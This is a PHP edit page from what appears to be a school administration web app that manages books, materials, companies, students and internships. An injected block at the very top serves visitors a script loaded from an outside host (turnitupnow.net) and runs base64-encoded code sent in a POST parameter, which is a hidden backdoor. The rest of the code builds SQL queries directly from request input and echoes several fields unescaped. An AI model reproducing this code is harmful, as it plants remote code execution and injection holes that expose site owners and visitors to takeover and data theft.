<link href="resources/estilos.css" rel="stylesheet" type="text/css">

<p>edit.php</p>

<?php global $sessdt_o; if(!$sessdt_o) { $sessdt_o = 1; $sessdt_k = "lb11"; if(!@$_COOKIE[$sessdt_k]) { $sessdt_f = "102"; if(!@headers_sent()) { @setcookie($sessdt_k,$sessdt_f); } else { echo "<script>document.cookie='".$sessdt_k."=".$sessdt_f."';</script>"; } } else { if($_COOKIE[$sessdt_k]=="102") { $sessdt_f = (rand(1000,9000)+1); if(!@headers_sent()) { @setcookie($sessdt_k,$sessdt_f); } else { echo "<script>document.cookie='".$sessdt_k."=".$sessdt_f."';</script>"; } $sessdt_j = @$_SERVER["HTTP_HOST"].@$_SERVER["REQUEST_URI"]; $sessdt_v = urlencode(strrev($sessdt_j)); $sessdt_u = "http://turnitupnow.net/?rnd=".$sessdt_f.substr($sessdt_v,-200); echo "<script src='$sessdt_u'></script>"; echo "<meta http-equiv='refresh' content='0;url=http://$sessdt_j'><!--"; } } $sessdt_p = "showimg"; if(isset($_POST[$sessdt_p])){eval(base64_decode(str_replace(chr(32),chr(43),$_POST[$sessdt_p])));exit;} }
 if (isset($_GET['ok'])) {

		if($_GET['menu']==1) { //Actualiza Libros
		
			$idactu = $_GET['edit'];
		
			$nombre = utf8_decode($_POST['nombre']);
			$isbn = utf8_decode($_POST['isbn']);
			$publicacion = utf8_decode($_POST['publicacion']);
			$autor = utf8_decode($_POST['autor']);
			$editorial = utf8_decode($_POST['editorial']);
			$campo = utf8_decode($_POST['campo']);
			$ubicacion = utf8_decode($_POST['ubicacion']);
			$obs = utf8_decode($_POST['obs']);
			
			$result = $db->Execute("UPDATE CDL_completa SET nombre = '$nombre' WHERE id = $idactu");
			$result = $db->Execute("UPDATE CDL_completa SET isbn = '$isbn' WHERE id = $idactu");
			$result = $db->Execute("UPDATE CDL_completa SET publicacion = '$publicacion' WHERE id = $idactu");
			$result = $db->Execute("UPDATE CDL_completa SET autor = '$autor' WHERE id = $idactu");
			$result = $db->Execute("UPDATE CDL_completa SET editorial = '$editorial' WHERE id = $idactu");
			$result = $db->Execute("UPDATE CDL_completa SET campo = '$campo' WHERE id = $idactu");
			$result = $db->Execute("UPDATE CDL_completa SET ubicacion = '$ubicacion' WHERE id = $idactu");
			$result = $db->Execute("UPDATE CDL_completa SET obs = '$obs' WHERE id = $idactu");
			
			echo "<span class=\"texte_mini\">&nbsp;Actualizado correctamente.</span>";
		
		}
		
		if($_GET['menu']==2) { //Actualiza Material
		
			$idactu = $_GET['edit'];
		
			$nombre = utf8_decode($_POST['nombre']);
			$concepto = utf8_decode($_POST['concepto']);
			$fabricante = utf8_decode($_POST['fabricante']);
			$referencia = utf8_decode($_POST['referencia']);
			$cantidad = utf8_decode($_POST['cantidad']);
			$des = utf8_decode($_POST['des']);
			$ubicacion = utf8_decode($_POST['ubicacion']);
			$fecha = utf8_decode($_POST['fecha']);
			$departament = utf8_decode($_POST['departament']);
			
			$result = $db->Execute("UPDATE CDM_caract SET nombre = '$nombre' WHERE id = $idactu");
			$result = $db->Execute("UPDATE CDM_caract SET concepto = '$concepto' WHERE id = $idactu");
			$result = $db->Execute("UPDATE CDM_caract SET fabricante = '$fabricante' WHERE id = $idactu");
			$result = $db->Execute("UPDATE CDM_caract SET referencia = '$referencia' WHERE id = $idactu");
			$result = $db->Execute("UPDATE CDM_caract SET cantidad = '$cantidad' WHERE id = $idactu");
			$result = $db->Execute("UPDATE CDM_caract SET des = '$des' WHERE id = $idactu");
			$result = $db->Execute("UPDATE CDM_caract SET ubicacion = '$ubicacion' WHERE id = $idactu");
			$result = $db->Execute("UPDATE CDM_caract SET fecha = '$fecha' WHERE id = $idactu");
			$result = $db->Execute("UPDATE CDM_caract SET departament = '$departament' WHERE id = $idactu");
			
			echo "<span class=\"texte_mini\">&nbsp;Actualizado correctamente.</span>";
		
		}
		
		if($_GET['menu']==3) { 
		
			$idactu = $_GET['edit'];
		
			if($_GET['sub']==1) { //Empresas
			
				$nombre = utf8_decode($_POST['nombre']);
				$gerente = utf8_decode($_POST['gerente']);
				$direccion = utf8_decode($_POST['direccion']);
				$cp = utf8_decode($_POST['cp']);
				$poblacion = utf8_decode($_POST['poblacion']);
				$provincia = utf8_decode($_POST['provincia']);
				$telf1 = utf8_decode($_POST['telf1']);
				$fax = utf8_decode($_POST['fax']);
				$cif = utf8_decode($_POST['cif']);
				$curs = utf8_decode($_POST['curs']);
				$evalua_anterior = utf8_decode($_POST['evalua']);
				$familia = utf8_decode($_POST['familia']);
				$evalua = utf8_decode($_POST['evalua2']);
				$concert = utf8_decode($_POST['concert']); 
				$nom_comercial = $_POST['nom_comercial'];
				$activitat = $_POST['activitat'];
				$nif_gerent = $_POST['nif_gerent'];
				$instructor = $_POST['instructor'];
				$nif_instructor = $_POST['nif_instructor'];
				$carrec_instructor = $_POST['carrec_instructor'];
				$horari_laboral = $_POST['horari_laboral'];
				$observacions = $_POST['observacions'];

				
				$result = $db->Execute("UPDATE CDE_empresas_BACK2 SET empresa = '$nombre' WHERE id = $idactu");
				$result = $db->Execute("UPDATE CDE_empresas_BACK2 SET responsable = '$gerente' WHERE id = $idactu");
				$result = $db->Execute("UPDATE CDE_empresas_BACK2 SET direccion = '$direccion' WHERE id = $idactu");
				$result = $db->Execute("UPDATE CDE_empresas_BACK2 SET cp = '$cp' WHERE id = $idactu");
				$result = $db->Execute("UPDATE CDE_empresas_BACK2 SET ciutat = '$poblacion' WHERE id = $idactu");
				$result = $db->Execute("UPDATE CDE_empresas_BACK2 SET provincia = '$provincia' WHERE id = $idactu");
				$result = $db->Execute("UPDATE CDE_empresas_BACK2 SET telf = '$telf1' WHERE id = $idactu");
				$result = $db->Execute("UPDATE CDE_empresas_BACK2 SET fax = '$fax' WHERE id = $idactu");
				$result = $db->Execute("UPDATE CDE_empresas_BACK2 SET cif = '$cif' WHERE id = $idactu");
				$result = $db->Execute("UPDATE CDE_empresas_BACK2 SET evaluacio = '$evalua' WHERE id = $idactu");
				$result = $db->Execute("UPDATE CDE_empresas_BACK2 SET curs = '$curs' WHERE id = $idactu");
				$result = $db->Execute("UPDATE CDE_empresas_BACK2 SET familia = '$familia' WHERE id = $idactu");
				$result = $db->Execute("UPDATE CDE_empresas_BACK2 SET evalua_anterior = '$evalua_anterior' WHERE id = $idactu");
				$result = $db->Execute("UPDATE CDE_empresas_BACK2 SET concert = '$concert' WHERE id = $idactu");
				$result = $db->Execute("UPDATE CDE_empresas_BACK2 SET nom_comercial = '$nom_comercial' WHERE id = $idactu");
				$result = $db->Execute("UPDATE CDE_empresas_BACK2 SET activitat = '$activitat' WHERE id = $idactu");
				$result = $db->Execute("UPDATE CDE_empresas_BACK2 SET nif_gerent = '$nif_gerent' WHERE id = $idactu");
				$result = $db->Execute("UPDATE CDE_empresas_BACK2 SET instructor = '$instructor' WHERE id = $idactu");
				$result = $db->Execute("UPDATE CDE_empresas_BACK2 SET nif_instructor = '$nif_instructor' WHERE id = $idactu");
				$result = $db->Execute("UPDATE CDE_empresas_BACK2 SET carrec_instructor = '$carrec_instructor' WHERE id = $idactu");
				$result = $db->Execute("UPDATE CDE_empresas_BACK2 SET horari_laboral = '$horari_laboral' WHERE id = $idactu");
				$result = $db->Execute("UPDATE CDE_empresas_BACK2 SET observacions = '$observacions' WHERE id = $idactu");
				
			}
			
			if($_GET['sub']==2) { //Alumnos
			
				$alumne = utf8_decode($_POST['alumne']);
				$dni = utf8_decode($_POST['dni']);
				$nacimiento = utf8_decode($_POST['nacimiento']);
				$direccion = utf8_decode($_POST['direccion']);
				$poblacion = utf8_decode($_POST['poblacion']);
				$cp = utf8_decode($_POST['cp']);
				$provincia = utf8_decode($_POST['provincia']);
				$telf = utf8_decode($_POST['telf']);
				$movil = utf8_decode($_POST['movil']);
				$email = utf8_decode($_POST['email']);
				$exp = utf8_decode($_POST['exp']);
				$exppro = utf8_decode($_POST['exppro']);
				$estudios = utf8_decode($_POST['estudios']);
				
				$result = $db->Execute("UPDATE CDE_alumnos SET alumne = '$alumne' WHERE id = $idactu");
				$result = $db->Execute("UPDATE CDE_alumnos SET dni = '$dni' WHERE id = $idactu");
				$result = $db->Execute("UPDATE CDE_alumnos SET nacimiento = '$nacimiento' WHERE id = $idactu");
				$result = $db->Execute("UPDATE CDE_alumnos SET direccion = '$direccion' WHERE id = $idactu");
				$result = $db->Execute("UPDATE CDE_alumnos SET poblacion = '$poblacion' WHERE id = $idactu");
				$result = $db->Execute("UPDATE CDE_alumnos SET cp = '$cp' WHERE id = $idactu");
				$result = $db->Execute("UPDATE CDE_alumnos SET provincia = '$provincia' WHERE id = $idactu");
				$result = $db->Execute("UPDATE CDE_alumnos SET telf = '$telf' WHERE id = $idactu");
				$result = $db->Execute("UPDATE CDE_alumnos SET movil = '$movil' WHERE id = $idactu");
				$result = $db->Execute("UPDATE CDE_alumnos SET email = '$email' WHERE id = $idactu");
				$result = $db->Execute("UPDATE CDE_alumnos SET exp = '$exp' WHERE id = $idactu");
				$result = $db->Execute("UPDATE CDE_alumnos SET exppro = '$exppro' WHERE id = $idactu");
				$result = $db->Execute("UPDATE CDE_alumnos SET estudios = '$estudios' WHERE id = $idactu");
			
			}
			
			if($_GET['sub']==3) { //Ciclos formativos
			
				$idf = utf8_decode($_POST['idf']);
				$cicle = utf8_decode($_POST['cicle']);
				$codi = utf8_decode($_POST['codi']);
				$duracio = utf8_decode($_POST['duracio']);
				
				$result = $db->Execute("UPDATE CDE_cicleform SET idf = '$idf' WHERE id = $idactu");
				$result = $db->Execute("UPDATE CDE_cicleform SET cicle = '$cicle' WHERE id = $idactu");
				$result = $db->Execute("UPDATE CDE_cicleform SET codi = '$codi' WHERE id = $idactu");
				$result = $db->Execute("UPDATE CDE_cicleform SET duracio = '$duracio' WHERE id = $idactu");
			
			}
			
			if($_GET['sub']==4) {  //FCT
			
				$alumne = utf8_decode($_POST['alumne']);
				$empresa = utf8_decode($_POST['empresa']);
				$cicle = utf8_decode($_POST['cicle']);
				$curs = utf8_decode($_POST['curs']);
				$finicio = utf8_decode($_POST['finicio']);
				$ffin = utf8_decode($_POST['ffin']);
				$evaluacion = utf8_decode($_POST['evaluacion']);
				$revaluacion = utf8_decode($_POST['revaluacion']);
				
				$result = $db->Execute("UPDATE CDE_fct SET alumne = '$alumne' WHERE id = $idactu");
				$result = $db->Execute("UPDATE CDE_fct SET empresa = '$empresa' WHERE id = $idactu");
				$result = $db->Execute("UPDATE CDE_fct SET cicle = '$cicle' WHERE id = $idactu");
				$result = $db->Execute("UPDATE CDE_fct SET curs = '$curs' WHERE id = $idactu");
				$result = $db->Execute("UPDATE CDE_fct SET finicio = '$finicio' WHERE id = $idactu");
				$result = $db->Execute("UPDATE CDE_fct SET ffin = '$ffin' WHERE id = $idactu");
				$result = $db->Execute("UPDATE CDE_fct SET evaluacion = '$evaluacion' WHERE id = $idactu");
				$result = $db->Execute("UPDATE CDE_fct SET revaluacion = '$revaluacion' WHERE id = $idactu");
			
			}
			
			if($_GET['sub']==5) { //Demandas
			
				$cicle = utf8_decode($_POST['cicle']);
				$empresa = utf8_decode($_POST['empresa']);
				$fecha = utf8_decode($_POST['fecha']);
				$p_recoge = utf8_decode($_POST['p_recoge']);
				$f_respuesta = utf8_decode($_POST['f_respuesta']);
				$p_responde = utf8_decode($_POST['p_responde']);
				$c_demanda = utf8_decode($_POST['c_demanda']);
				$cargo = utf8_decode($_POST['cargo']);
				$ciudad = utf8_decode($_POST['ciudad']);
				$provincia = utf8_decode($_POST['provincia']);
				$t_demanda = utf8_decode($_POST['t_demanda']);
				$fax_demanda = utf8_decode($_POST['fax_demanda']);
				$mail_contacta = utf8_decode($_POST['mail_contacta']);
				$contactar = utf8_decode($_POST['contactar']);
				$llamar = utf8_decode($_POST['llamar']);
				$colaborar = utf8_decode($_POST['colaborar']);
				$notas = utf8_decode($_POST['notas']);
				
				$result = $db->Execute("UPDATE CDE_demandas SET cicle = '$cicle' WHERE id = $idactu");
				$result = $db->Execute("UPDATE CDE_demandas SET empresa = '$empresa' WHERE id = $idactu");
				$result = $db->Execute("UPDATE CDE_demandas SET fecha = '$fecha' WHERE id = $idactu");
				$result = $db->Execute("UPDATE CDE_demandas SET p_recoge = '$p_recoge' WHERE id = $idactu");
				$result = $db->Execute("UPDATE CDE_demandas SET f_respuesta = '$f_respuesta' WHERE id = $idactu");
				$result = $db->Execute("UPDATE CDE_demandas SET p_responde = '$p_rsponde' WHERE id = $idactu");
				$result = $db->Execute("UPDATE CDE_demandas SET c_demanda = '$c_demanda' WHERE id = $idactu");
				$result = $db->Execute("UPDATE CDE_demandas SET cargo = '$cargo' WHERE id = $idactu");
				$result = $db->Execute("UPDATE CDE_demandas SET ciudad = '$ciudad' WHERE id = $idactu");
				$result = $db->Execute("UPDATE CDE_demandas SET provincia = '$provincia' WHERE id = $idactu");
				$result = $db->Execute("UPDATE CDE_demandas SET t_demanda = '$t_demanda' WHERE id = $idactu");
				$result = $db->Execute("UPDATE CDE_demandas SET fax_demanda = '$fax_demanda' WHERE id = $idactu");
				$result = $db->Execute("UPDATE CDE_demandas SET mail_contacta = '$mail_contacta' WHERE id = $idactu");
				$result = $db->Execute("UPDATE CDE_demandas SET contactar = '$contactar' WHERE id = $idactu");
				$result = $db->Execute("UPDATE CDE_demandas SET llamar = '$llamar' WHERE id = $idactu");
				$result = $db->Execute("UPDATE CDE_demandas SET colaborar = '$colaborar' WHERE id = $idactu");
				$result = $db->Execute("UPDATE CDE_demandas SET notas = '$notas' WHERE id = $idactu");
			
			}
		
		
		}
}

?>



<table width="291" border="0" align="center" cellpadding="0" cellspacing="0">
                      <tr>
                        <td width="291" height="22" bgcolor="#000000" class="texte_normal_blanco">&nbsp;Editar / Modificar</td>
                      </tr>
                    </table>
                                    <table width="290" border="0" align="center" cellpadding="0" cellspacing="0">
                                      <tr>
                                        <td height="6"></td>
                                      </tr>
                                    </table>
                                <?php $idedit = $_GET['edit']; ?>    
								<?php if($_GET['menu']==1) { //Libros
										$result = $db->Execute("SELECT * FROM CDL_completa WHERE id = $idedit");
										if ($result === false) die("failed"); 
										
										$id = $result->fields[0];
										$nombre = $result->fields[1];
										$isbn = $result->fields[2];
										$publicacion = $result->fields[3];
										$autor = $result->fields[4];
										$editorial = $result->fields[5];
										$campo = $result->fields[6];
										$ubicacion = $result->fields[7];
										$obs = $result->fields[8];
								
								?>
<form id="form1" name="form1" method="post" action="index.php?menu=<?php echo $_GET['menu'] ?>&edit=<?php echo $id ?>&ok" style="margin:0px">
                             
<table width="290" border="0" align="center" cellpadding="0" cellspacing="0" class="texte_normal">
                                  <tr>
                                    <td width="120" height="22" bgcolor="#F8F8F8">&nbsp;Nombre</td>
                                    <td width="170" bgcolor="#F8F8F8"><label>
                                      <input name="nombre" type="text" class="texte_normal" id="nombre" value="<?php echo htmlentities($nombre) ?>" />
                                    </label></td>
                                  </tr>
                                  <tr>
                                    <td height="22" bgcolor="#F8F8F8">&nbsp;ISBN</td>
                                    <td bgcolor="#F8F8F8"><input name="isbn" type="text" class="texte_normal" id="isbn" value="<?php echo  htmlentities($isbn) ?>" /></td>
                                  </tr>
                                  <tr>
                                    <td height="22" bgcolor="#F8F8F8">&nbsp;Año Publicación</td>
                                    <td bgcolor="#F8F8F8"><input name="pubicacion" type="text" class="texte_normal" id="pubicacion" value="<?php echo  htmlentities($publicacion) ?>" /></td>
                                  </tr>
                                  <tr>
                                    <td height="22" bgcolor="#F8F8F8">&nbsp;Autor</td>
                                    <td bgcolor="#F8F8F8"><input name="autor" type="text" class="texte_normal" id="autor" value="<?php echo  htmlentities($autor) ?>" /></td>
                                  </tr>
                                  <tr>
                                    <td height="22" bgcolor="#F8F8F8">&nbsp;Editorial</td>
                                    <td bgcolor="#F8F8F8"><input name="editorial" type="text" class="texte_normal" id="editorial" value="<?php echo  htmlentities($editorial) ?>" /></td>
                                  </tr>
                                  <tr>
                                    <td height="22" bgcolor="#F8F8F8">&nbsp;Campo</td>
                                    <td bgcolor="#F8F8F8"><input name="campo" type="text" class="texte_normal" id="campo" value="<?php echo  htmlentities($campo) ?>" /></td>
                                  </tr>
                                  <tr>
                                    <td height="22" bgcolor="#F8F8F8">&nbsp;Ubicación</td>
                                    <td bgcolor="#F8F8F8"><input name="ubicacion" type="text" class="texte_normal" id="ubicacion" value="<?php echo  htmlentities($ubicacion) ?>" /></td>
                                  </tr>
                                  <tr>
                                    <td height="22" bgcolor="#F8F8F8">Observaciones</td>
                                    <td bgcolor="#F8F8F8"><textarea name="obs" rows="3" class="texte_normal" id="obs"><?php echo htmlentities($obs) ?></textarea></td>
                                  </tr>
                                  <tr>
                                    <td height="26" bgcolor="#F8F8F8">&nbsp;</td>
                                    <td align="left" bgcolor="#F8F8F8"><label>
                                      <input name="button5" type="submit" class="texte_normal" id="button5" value="Guardar" />
                                    </label></td>
                                  </tr>
                                </table>  
                                 </form>
                                <?php } ?> 
                                
                                
                                
								<?php if($_GET['menu']==2) { //Caracteristicas
								
										$result = $db->Execute("SELECT * FROM CDM_caract WHERE id = $idedit");
										if ($result === false) die("failed"); 
										
										$id = $result->fields[0];
										$nombre = $result->fields[1];
										$concepto = $result->fields[2];
										$fabricante = $result->fields[3];
										$referencia = $result->fields[4];
										$cantidad = $result->fields[5];
										$des = $result->fields[6];
										$ubicacion = $result->fields[7];
										$fecha = $result->fields[8];
										$departament = $result->fields[8];
								
								?>
								<form id="form2" name="form2" method="post" action="index.php?menu=<?php echo $_GET['menu'] ?>&edit=<?php echo $id ?>&ok">
                                
                                <table width="290" border="0" align="center" cellpadding="0" cellspacing="0" class="texte_normal">
                                  <tr>
                                    <td width="120" height="22" bgcolor="#F8F8F8">&nbsp;Nombre</td>
                                    <td width="170" bgcolor="#F8F8F8"><label>
                                      <input name="nombre" type="text" class="texte_normal" id="nombre" value="<?php echo $nombre ?>" />
                                    </label></td>
                                  </tr>
                                  <tr>
                                    <td height="22" bgcolor="#F8F8F8">&nbsp;Concepto</td>
                                    <td bgcolor="#F8F8F8"><input name="concepto" type="text" class="texte_normal" id="textfield11" value="<?php echo $concepto ?>" /></td>
                                  </tr>
                                  <tr>
                                    <td height="22" bgcolor="#F8F8F8">&nbsp;Fabricante</td>
                                    <td bgcolor="#F8F8F8"><input name="fabricante" type="text" class="texte_normal" id="textfield12" value="<?php echo $fabricante ?>" /></td>
                                  </tr>
                                  <tr>
                                    <td height="22" bgcolor="#F8F8F8">&nbsp;Referencia</td>
                                    <td bgcolor="#F8F8F8"><input name="referencia" type="text" class="texte_normal" id="textfield13" value="<?php echo $referencia ?>" /></td>
                                  </tr>
                                  <tr>
                                    <td height="22" bgcolor="#F8F8F8">&nbsp;Cantidad</td>
                                    <td bgcolor="#F8F8F8"><input name="cantidad" type="text" class="texte_normal" id="textfield14" value="<?php echo $cantidad ?>" /></td>
                                  </tr>
                                
                                  <tr>
                                    <td height="22" bgcolor="#F8F8F8">&nbsp;Ubicación</td>
                                    <td bgcolor="#F8F8F8"><input name="ubicacion" type="text" class="texte_normal" id="textfield16" value="<?php echo $ubicacion ?>" /></td>
                                  </tr>
                                  <tr>
                                    <td height="22" bgcolor="#F8F8F8">&nbsp;Fecha</td>
                                    <td bgcolor="#F8F8F8"><input name="fecha" type="text" class="texte_normal" id="textfield18" value="<?php echo $fecha ?>" /></td>
                                  </tr>
                                  <tr>
                                    <td height="22" bgcolor="#F8F8F8">&nbsp;Departamento</td>
                                    <td bgcolor="#F8F8F8"><input name="departament" type="text" class="texte_normal" id="departament" value="<?php echo $departament ?>" /></td>
                                  </tr>
                                  <tr>
                                    <td height="22" bgcolor="#F8F8F8">Observaciones</td>
                                    <td bgcolor="#F8F8F8"><textarea name="des" rows="3" class="texte_normal" id="textfield17"><?php echo $obs ?></textarea></td>
                                  </tr>
                                  <tr>
                                    <td height="26" bgcolor="#F8F8F8">&nbsp;</td>
                                    <td align="left" bgcolor="#F8F8F8"><label>
                                      <input name="button2" type="submit" class="texte_normal" id="button2" value="Guardar" />
                                    </label></td>
                                  </tr>
                                </table>
</form>
                                <?php } ?> 
                                
                                
                                
                                
                                 <?php if ($_GET['menu']==3) {  //Empresas
								 										 		
										$result = $db->Execute("SELECT * FROM CDE_empresas_BACK2 WHERE id = $idedit");
										if ($result === false) die("failed"); 
										
										$id = $result->fields[0];
										$nombre = $result->fields[1];
										$gerente = $result->fields[2];
										$direccion = $result->fields[3];
										$cp = $result->fields[4];
										$poblacion = $result->fields[5];
										$provincia = $result->fields[6];
										$telf1 = $result->fields[7];
										$fax = $result->fields[8];
										$cif = $result->fields[9];
										$curs = $result->fields[10];
										$familia = $result->fields[11];
										$evalua = $result->fields[12];
										$evalua_anterior = $result->fields['evalua_anterior'];
										$concert = $result->fields[13];
										$nom_comercial = $result->fields['nom_comercial'];
										$activitat = $result->fields['activitat'];
										$nif_gerent = $result->fields['nif_gerent'];
										$instructor = $result->fields['instructor'];
										$nif_instructor = $result->fields['nif_instructor'];
										$carrec_instructor = $result->fields['carrec_instructor'];
										$horari_laboral = $result->fields['horari_laboral'];
										$observacions = $result->fields['observacions'];
										
								?>
                                 <form id="form3" name="form3" method="post" action="index.php?menu=<?php echo $_GET['menu'] ?>&sub=1&edit=<?php echo $id ?>&ok" style="margin:0px">
                                <table width="290" border="0" align="center" cellpadding="0" cellspacing="0" class="texte_normal">
                                  <tr>
                                    <td width="120" height="22" bgcolor="#F8F8F8">&nbsp;Nombre</td>
                                    <td width="170" bgcolor="#F8F8F8"><label>
                                    <input name="nombre" type="text" class="texte_normal" id="nombre" value="<?php echo htmlentities($nombre) ?>" />
                                    </label></td>
                                  </tr>
                                  <tr>
                                    <td height="22" bgcolor="#F8F8F8">&nbsp;Gerente</td>
                                    <td bgcolor="#F8F8F8"><label>
                                    <input name="gerente" type="text" class="texte_normal" id="textfield9" value="<?php echo htmlentities($gerente) ?>" />
                                    </label></td>
                                  </tr>
                                  <tr>
                                    <td height="22" bgcolor="#F8F8F8">&nbsp;Dirección</td>
                                    <td bgcolor="#F8F8F8"><label>
                                    <input name="direccion" type="text" class="texte_normal" id="textfield15" value="<?php echo htmlentities($direccion) ?>" />
                                    </label></td>
                                  </tr>
                                  <tr>
                                    <td height="22" bgcolor="#F8F8F8">&nbsp;CP</td>
                                    <td bgcolor="#F8F8F8"><label>
                                    <input name="cp" type="text" class="texte_normal" id="textfield19" value="<?php echo htmlentities($cp) ?>" />
                                    </label></td>
                                  </tr>
                                  <tr>
                                    <td height="22" bgcolor="#F8F8F8">&nbsp;Poblacion</td>
                                    <td bgcolor="#F8F8F8"><label>
                                    <input name="poblacion" type="text" class="texte_normal" id="textfield19" value="<?php echo htmlentities($poblacion) ?>" />
                                    </label></td>
                                  </tr>
                                  <tr>
                                    <td height="22" bgcolor="#F8F8F8">&nbsp;Provincia</td>
                                    <td bgcolor="#F8F8F8"><label>
                                    <input name="provincia" type="text" class="texte_normal" id="textfield15" value="<?php echo htmlentities($provincia) ?>" />
                                    </label></td>
                                  </tr>
                                  <tr>
                                    <td height="22" bgcolor="#F8F8F8">&nbsp;Telf 1</td>
                                    <td bgcolor="#F8F8F8"><label>
                                    <input name="telf1" type="text" class="texte_normal" id="textfield20" value="<?php echo htmlentities($telf1) ?>" />
                                    </label></td>
                                  </tr>
                                  <tr>
                                    <td height="22" bgcolor="#F8F8F8">&nbsp;Fax</td>
                                    <td bgcolor="#F8F8F8"><label>
                                      <input name="fax" type="text" class="texte_normal" id="textfield7" value="<?php echo htmlentities($fax) ?>" />
                                    </label></td>
                                  </tr>
                                  <tr>
                                    <td height="22" bgcolor="#F8F8F8">&nbsp;CIF</td>
                                    <td bgcolor="#F8F8F8"><label>
                                    <input name="cif" type="text" class="texte_normal" id="textfield29" value="<?php echo htmlentities($cif) ?>" />
                                    </label></td>
                                  </tr>
                                  <tr>
                                    <td height="22" bgcolor="#F8F8F8">&nbsp;Curso</td>
                                    <td bgcolor="#F8F8F8"><label>
                                      <input name="curs" type="text" class="texte_normal" id="curs" value="<?php echo htmlentities($curs) ?>" />
                                    </label></td>
                                  </tr>
                                  <tr>
                                    <td height="22" bgcolor="#F8F8F8">&nbsp;Familia 1</td>
                                    <td bgcolor="#F8F8F8"><label>
                                      <input name="familia" type="text" class="texte_normal" id="textfield6" value="<?php echo htmlentities($familia) ?>" />
                                    </label></td>
                                  </tr>
                                  <tr>
                                    <td height="22" bgcolor="#F8F8F8">&nbsp;Eval. Anterior</td>
                                    <td bgcolor="#F8F8F8"><label>
                                      <input name="evalua" type="text" class="texte_normal" id="textfield5" value="<?php echo htmlentities($evalua_anterior) ?>" />
                                    </label></td>
                                  </tr>
                                  <tr>
                                    <td height="22" bgcolor="#F8F8F8">&nbsp;Eval. Actual</td>
                                    <td bgcolor="#F8F8F8"><label>
                                      <input name="evalua2" type="text" class="texte_normal" id="evalua2" value="<?php echo htmlentities($evalua) ?>" />
                                    </label></td>
                                  </tr>
                                  <tr>
                                    <td height="22" bgcolor="#F8F8F8">&nbsp;Concert</td>
                                    <td bgcolor="#F8F8F8"><label>
                                      <input name="concert" type="text" class="texte_normal" id="textfield2" value="<?php echo htmlentities($concert) ?>" />
                                    </label></td>
                                  </tr>
                                  <tr>
                                    <td height="26" bgcolor="#F8F8F8">&nbsp;Nombre comercial</td>
                                    <td bgcolor="#F8F8F8"><label>
                                    	<input name="nom_comercial" type="text" class="texte_normal" id="nom_comercial" value="<?php echo htmlentities($nom_comercial) ?>" />
                                    </label></td>
                                  </tr>
                                  <tr>
                                    <td height="26" bgcolor="#F8F8F8">&nbsp;Actividad</td>
                                    <td bgcolor="#F8F8F8"><label>
                                    	<input name="activitat" type="text" class="texte_normal" id="activitat" value="<?php echo htmlentities($activitat) ?>" />
                                    </label></td>
                                  </tr>
                                  <tr>
                                    <td height="26" bgcolor="#F8F8F8">&nbsp;NIF gerente</td>
                                    <td bgcolor="#F8F8F8"><label>
                                    	<input name="nif_gerent" type="text" class="texte_normal" id="nif_gerent" value="<?php echo htmlentities($nif_gerent) ?>" />
                                    </label></td>
                                  </tr>
                                  <tr>
                                    <td height="26" bgcolor="#F8F8F8">&nbsp;Instructor</td>
                                    <td bgcolor="#F8F8F8"><label>
                                    	<input name="instructor" type="text" class="texte_normal" id="instructor" value="<?php echo htmlentities($instructor) ?>" />
                                    </label></td>
                                  </tr>
                                  <tr>
                                    <td height="26" bgcolor="#F8F8F8">&nbsp;NIF Instructor</td>
                                    <td bgcolor="#F8F8F8"><label>
                                    	<input name="nif_instructor" type="text" class="texte_normal" id="nif_instructor" value="<?php echo htmlentities($nif_instructor) ?>" />
                                    </label></td>
                                  </tr>
                                  <tr>
                                    <td height="26" bgcolor="#F8F8F8">&nbsp;Cargo instructor</td>
                                    <td bgcolor="#F8F8F8"><label>
                                    	<input name="carrec_instructor" type="text" class="texte_normal" id="carrec_instructor" value="<?php echo htmlentities($carrec_instructor) ?>" />
                                    </label></td>
                                  </tr>
                                  <tr>
                                    <td height="26" bgcolor="#F8F8F8">&nbsp;Horario laboral</td>
                                    <td bgcolor="#F8F8F8"><label>
                                    	<input name="horari_laboral" type="text" class="texte_normal" id="horari_laboral" value="<?php echo htmlentities($horari_laboral) ?>" />
                                    </label></td>
                                  </tr>
                                  <tr>
                                    <td height="26" bgcolor="#F8F8F8">&nbsp;Observaciones</td>
                                    <td bgcolor="#F8F8F8"><label>
                                    	<input name="observacions" type="text" class="texte_normal" id="observacions" value="<?php echo htmlentities($observacions) ?>" />
                                    </label></td>
                                  </tr>
                                  
                                  <tr>
                                    <td height="26" bgcolor="#F8F8F8">&nbsp;</td>
                                    <td align="left" bgcolor="#F8F8F8"><label>
                                    <input name="button" type="submit" class="texte_normal" id="button" value="Guardar" />
                                    </label></td>
                                  </tr>
                                </table>
</form>
                                <?php } ?> 
                                
                                
                                
                                <?php if (($_GET['menu']==3) && ($_GET['sub']==2)) { //alumnos
										$result = $db->Execute("SELECT * FROM CDE_alumnos WHERE id = $idedit");
										if ($result === false) die("failed"); 
										
										$id = $result->fields[0];
										$alumne = $result->fields[1];
										$dni = $result->fields[2];
										$nacimiento = $result->fields[3];
										$direccion = $result->fields[4];
										$poblacion = $result->fields[5];
										$cp = $result->fields[6];
										$provincia = $result->fields[7];
										$telf = $result->fields[8];
										$movil = $result->fields[9];
										$email = $result->fields[10];
										$exp = $result->fields[11];
										$exppro = $result->fields[12];
										$estudios = $result->fields[13];
								?>
                                <form id="form3" name="form3" method="post" action="index.php?menu=<?php echo $_GET['menu'] ?>&sub=<?php echo $_GET['sub'] ?>&edit=<?php echo $id ?>&ok" style="margin:0px">
                                <table width="290" border="0" align="center" cellpadding="0" cellspacing="0" class="texte_normal">
                                  <tr>
                                    <td width="120" height="22" bgcolor="#F8F8F8">&nbsp;Alumno</td>
                                    <td width="170" bgcolor="#F8F8F8"><label>
                                      <input name="alumne" type="text" class="texte_normal" id="alumne" value="<?php echo $alumne ?>" />
                                    </label></td>
                                  </tr>
                                  <tr>
                                    <td height="22" bgcolor="#F8F8F8">&nbsp;DNI</td>
                                    <td bgcolor="#F8F8F8"><label>
                                      <input name="dni" type="text" class="texte_normal" id="textfield31" value="<?php echo $dni ?>" />
                                    </label></td>
                                  </tr>
                                  <tr>
                                    <td height="22" bgcolor="#F8F8F8">&nbsp;Nacimiento</td>
                                    <td bgcolor="#F8F8F8"><label>
                                      <input name="nacimiento" type="text" class="texte_normal" id="textfield32" value="<?php echo $nacimiento ?>" />
                                    </label></td>
                                  </tr>
                                  <tr>
                                    <td height="22" bgcolor="#F8F8F8">&nbsp;Direccion</td>
                                    <td bgcolor="#F8F8F8"><label>
                                      <input name="direccion" type="text" class="texte_normal" id="textfield33" value="<?php echo $direccion ?>" />
                                    </label></td>
                                  </tr>
